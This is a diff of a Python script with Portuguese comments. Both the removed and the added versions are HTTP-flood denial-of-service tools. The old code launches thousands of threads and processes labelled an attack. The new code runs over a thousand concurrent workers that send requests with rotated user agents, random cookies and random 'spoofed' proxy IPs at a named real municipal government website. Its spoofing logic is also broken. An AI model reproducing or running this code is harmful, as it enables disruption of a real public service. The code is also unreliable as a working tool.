@@ -1,85 +1,66 @@
-import socket
-import sys
-import random
+import multiprocessing
 import threading
-import time
-from multiprocessing import Process
+import requests
+import random
+import string
+from scapy.all import RandIP
 
-# Função para ler os User Agents de um arquivo
-def read_user_agents(filename):
-    with open(filename, 'r') as file:
-        return [line.strip() for line in file]
+def read_file_lines(filename):
+    with open(filename, "r") as file:
+        lines = file.readlines()
+    return [line.strip() for line in lines]
 
-# Função para ler os Referers de um arquivo
-def read_referers(filename):
-    with open(filename, 'r') as file:
-        return [line.strip() for line in file]
+def generate_random_cookie():
+    cookie_name = ''.join(random.choices(string.ascii_letters, k=10))
+    cookie_value = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
+    return {cookie_name: cookie_value}
 
-# Lista de User Agents e Referers
-user_agents = read_user_agents("useragents.txt")
-referers = read_referers("referers.txt")
+def request_test():
+    user_agents = read_file_lines("useragents.txt")
+    referers = read_file_lines("referers.txt")
+    
+    user_agent = random.choice(user_agents)
+    referer = random.choice(referers)
+    spoofed_ip = str(RandIP())
+    
+    url = "https://www.guaruja.sp.gov.br/"  # Substitua pelo seu servidor autorizado
+    headers = {
+        "User-Agent": user_agent,
+        "Referer": referer,
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Connection": "keep-alive",
+        "Cache-Control": "max-age=0",
+        "Upgrade-Insecure-Requests": "1",
+        "DNT": "1",
+        "Sec-GPC": "1",
+        "TE": "Trailers"
+    }
+    cookies = generate_random_cookie()
+    response = requests.get(url, headers=headers, cookies=cookies, proxies={"http": spoofed_ip, "https": spoofed_ip})
+    print(f"Status da requisição com {user_agent}, referer {referer}, IP spoofed {spoofed_ip} e cookies {cookies}: {response.status_code}")
 
-# Função para enviar requisições HTTP GET com User Agent e Referer randomizados
-def http_get(url):
-    while True:
-        try:
-            # Criação do socket
-            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            s.connect((url, 80))
-            # Escolhe um user agent e referer aleatório
-            user_agent = random.choice(user_agents)
-            referer = random.choice(referers)
-            # Construção da requisição HTTP GET
-            request = "GET / HTTP/1.1\r\n"
-            request += "Host: " + url + "\r\n"
-            request += "User-Agent: " + user_agent + "\r\n"
-            request += "Referer: " + referer + "\r\n"
-            request += "Connection: keep-alive\r\n"
-            request += "Content-Length: 1000000\r\n"  # Tamanho do payload
-            request += "\r\n"
-            # Fragmentação do pacote
-            fragments = [request[i:i+1500] for i in range(0, len(request), 1500)]
-            # Envio dos fragmentos
-            for fragment in fragments:
-                s.send(fragment.encode())
-        except socket.error:
-            print("Erro ao enviar requisição")
-        finally:
-            s.close()
-
-# Função para iniciar o ataque
-def start_attack(url, duration):
-    threads = []
-    for _ in range(3014):
-        t = threading.Thread(target=http_get, args=(url,))
-        t.start()
-        threads.append(t)
-
+if __name__ == "__main__":
+    # Multiprocessing com 614 processos
     processes = []
-    for _ in range(2017):
-        p = Process(target=http_get, args=(url,))
+    for _ in range(614):
+        p = multiprocessing.Process(target=request_test)
         p.start()
         processes.append(p)
-
-    # Tempo de ataque
-    time.sleep(duration)
-
-    # Parar as threads
-    for t in threads:
-        t.join()
-
-    # Parar os processos
-    for p in processes:
-        p.terminate()
-        p.join()
-
-# Execução do ataque
-if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Uso: python app.py <url> <duration>")
-        sys.exit(1)
-
-    url = sys.argv[1]
-    duration = int(sys.argv[2])
-    print("Iniciando ataque...")
-    start_attack(url, duration)
+    
+    # Threads com 613 threads
+    threads = []
+    for _ in range(613):
+        t = threading.Thread(target=request_test)
+        t.start()
+        threads.append(t)
+    
+    try:
+        # Mantém o programa rodando até ser encerrado com Control+C
+        for p in processes:
+            p.join()
+        for t in threads:
+            t.join()
+    except KeyboardInterrupt:
+        print("Programa encerrado.")
